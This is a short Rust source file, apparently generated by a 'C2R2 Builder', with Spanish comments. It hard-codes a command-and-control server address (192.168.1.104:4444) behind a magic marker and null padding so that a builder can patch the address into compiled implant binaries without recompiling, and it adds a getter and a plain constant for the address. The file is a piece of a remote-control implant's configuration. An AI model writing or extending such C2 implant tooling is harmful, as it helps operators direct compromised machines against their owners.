// Generado automáticamente por C2R2 Builder v2.0
// IMPORTANTE: Este archivo contiene un marcador para permitir binary patching sin recompilación

// Dirección del servidor C2 con marcador mágico y padding para permitir reemplazo in-place
// Formato: "C2R2_SERVER_ADDRESS_PLACEHOLDER_" + "IP:PORT" + padding nulo (total 96 bytes)
// El marcador permite localizar esta cadena en el binario y reemplazar la IP sin recompilar
// NOTA: Se usa #[used] y #[no_mangle] para evitar que el compilador elimine o optimice esta constante
#[used]
#[no_mangle]
pub static C2_SERVER_PADDED: &[u8; 96] = b"C2R2_SERVER_ADDRESS_PLACEHOLDER_192.168.1.104:4444\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";

/// Obtiene la dirección del servidor C2 limpia (sin marcador ni padding)
/// Esto extrae solo la parte "IP:PORT" después del marcador
pub fn get_c2_server() -> &'static str {
    // El marcador tiene 32 bytes, después viene la IP:PORT
    let without_marker = &C2_SERVER_PADDED[32..];
    // Convertir bytes a str y remover padding nulo
    let str_slice = std::str::from_utf8(without_marker).unwrap_or("");
    str_slice.trim_end_matches('\0')
}

// Para compatibilidad con código existente
pub const C2_SERVER: &str = "192.168.1.104:4444";
